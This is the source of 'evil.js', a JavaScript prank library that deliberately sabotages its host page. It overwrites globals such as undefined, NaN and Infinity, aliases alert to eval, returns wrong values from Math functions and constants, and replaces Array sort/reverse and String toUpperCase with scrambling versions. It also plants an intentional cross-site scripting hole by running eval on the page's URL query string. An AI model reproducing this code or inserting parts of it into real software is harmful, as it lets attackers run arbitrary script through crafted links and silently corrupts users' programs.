// evil.js: http://kitgoncharov.github.com/evil.js
(function() {
  // Convenience aliases.
  var Math = this.Math, reverse = [].reverse, slice = [].slice, toString = {}.toString, toUpperCase = ''.toUpperCase,

  // Methods available in browsers.
  document = this.document, write = document && document.write, search = this.location && this.location.search;

  // Overwrite `undefined`, `NaN`, `Infinity`, and commonly-used debugging methods.
  this.undefined = this.NaN = 1 / 0;
  this.Infinity = '\u221e';
  this.alert = eval;
  this.prompt = this.confirm = this.open;

  // Invert the `isNaN` function.
  this.isNaN = function(value) {
    return value != value;
  };

  // Create a simple cross-site scripting vector.
  if (typeof search == 'string') eval(decodeURIComponent(search.replace('?', '')));

  // Wrap all content in `<marquee>` and `<blink>` elements.
  if (document && write) document.write = function(elements) {
    return write.call(document, '<marquee><blink>' + elements + '</blink></marquee>');
  };

  // Overwrite common `Math` methods and constants.
  this.Math = {
    'ceil': function() {
      return 42;
    },
    'max': Math.max,
    'min': function() {
      return Infinity;
    },
    'pow': function() {
      return 'pow pow pow!';
    },
    'random': function() {
      return String.fromCharCode(~~(Math.random() * 1e3));
    },
    'round': Math.sqrt,
    'SQRT2': Math.SQRT1_2,
    'SQRT1_2': Math.LOG2E,
    'LOG2E': Math.LN10,
    'LN10': Math.LN2,
    'LN2': Math.E,
    'E': Math.PI,
    'PI': 3.2
  };

  // Reverses and modifies the array.
  Array.prototype.reverse = function() {
    var length = this.length, element;
    while (length--) {
      element = this[length];
      switch (typeof element) {
        case 'string':
          element = reverse.call(element.split('')).join('');
          break;
        case 'number':
          element *= Math.random();
          break;
        case 'boolean':
          element /= 0;
          break;
        case 'function':
          element = function() {
            var parameters;
            if (typeof element.call == 'function') {
              parameters = slice.call(arguments, 1);
              return element.apply(null, reverse.call(parameters));
            }
            return element('4, 8, 15, 16, 23, 42');
          };
          element.exec = element.test = element;
          break;
        default:
          element = toUpperCase.call(toString.call(element));
      }
      this[length] = element;
    }
    return reverse.call(this);
  };

  // Shuffles the array.
  Array.prototype.sort = function() {
    var index, element, length = this.length;
    while (length--) {
      index = (Math.random() * length | 0) + 1;
      element = this[index];
      this[index] = this[length];
      this[length] = element;
    }
    return this;
  };

  // Scrambles the string.
  String.prototype.toUpperCase = function() {
    var value = toUpperCase.call(this), length = value.length, element, result = '', multiplier = ~~(Math.random() * length);
    while (length--) {
      element = value.charCodeAt(length);
      result += String.fromCharCode(element * multiplier);
    }
    return result.replace(/([A-Z])/g, '$1\u0305');
  };
}).call(this);